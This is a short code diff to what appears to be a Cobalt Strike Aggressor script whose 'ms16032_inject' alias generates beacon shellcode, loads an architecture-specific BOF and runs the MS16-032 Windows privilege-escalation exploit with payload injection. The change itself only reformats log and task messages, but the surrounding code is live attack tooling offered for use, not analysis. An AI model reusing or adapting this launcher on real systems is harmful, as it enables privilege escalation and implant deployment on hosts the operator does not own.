@@ -30,7 +30,8 @@ alias ms16032_inject {
         return;
     }
     
-    blog($1, "Generated " . strlen($payload) . " bytes of shellcode for $listener (arch: $barch)");
+    blog($1, "Generated " . strlen($payload) . " bytes of shellcode for $listener");
+    blog($1, "Architecture: $barch");
     
     # Read the appropriate BOF file
     if($barch eq "x64") {
@@ -52,7 +53,8 @@ alias ms16032_inject {
     $args = bof_pack($1, "b", $payload);
     
     # Execute BOF
-    btask($1, "Tasked beacon to run MS16-032 with beacon injection (listener: $listener, arch: $barch)");
+    btask($1, "Tasked beacon to run MS16-032 with beacon injection");
+    btask($1, "Listener: $listener | Architecture: $barch");
     beacon_inline_execute($1, $data, "go", $args);
 }
 
